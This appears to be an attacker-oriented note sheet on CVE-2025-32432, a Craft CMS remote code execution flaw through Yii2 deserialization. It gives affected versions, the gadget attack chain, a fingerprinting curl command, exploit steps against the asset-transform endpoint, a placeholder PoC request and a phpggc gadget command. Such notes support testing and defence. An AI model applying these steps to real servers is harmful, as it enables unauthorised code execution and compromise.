# CVE-2025-32432 — Craft CMS RCE (Yii2 Deserialization)
## Last Updated: Mon Jul 06 2026

### Affected Versions:
- Craft CMS 3.0.0-RC1 to 3.9.14
- Craft CMS 4.0.0-RC1 to 4.14.14
- Craft CMS 5.0.0-RC1 to 5.6.16

### Root Cause:
Insecure deserialization in Yii2 framework (CVE-2024-4990)
→ Craft CMS asset transform generation feature

### Attack Chain:
1. Exploit __class bypass in image transform endpoint
2. Load PhpManager gadget
3. Point it toward poisoned session file
4. When PhpManager loads the file → RCE

### Detection:
# Check Craft CMS version
curl -sk "http://target/" | grep -i "craft\|version"
# Check /index.php?p= (Craft default routing)
# Check /craft id/admin, /cpresources/

### Exploit Steps:
1. POST to /index.php?action=assets/generate-transform with crafted payload
2. Inject serialized object via __class parameter
3. Chain with Yii2 gadget → RCE

### PoC (conceptual):
POST /index.php?action=assets/generate-transform HTTP/1.1
Content-Type: application/x-www-form-urlencoded

transform=<serialized_payload>&__class=<PhpManager>

### Tools:
- PHPGGC for Yii2 chains: phpggc Yii2/RCE system id
- Manual serialized payload generation

### References:
- https://craftcms.com/knowledge-base/craft-cms-cve-2025-32432
- https://censys.com/advisory/cve-2025-32432
- https://www.sonicwall.com/blog/craftcms-vulnerability-exposes-systems-to-pre-auth-rce-now-exploited-in-the-wild-cve-2025-32432-
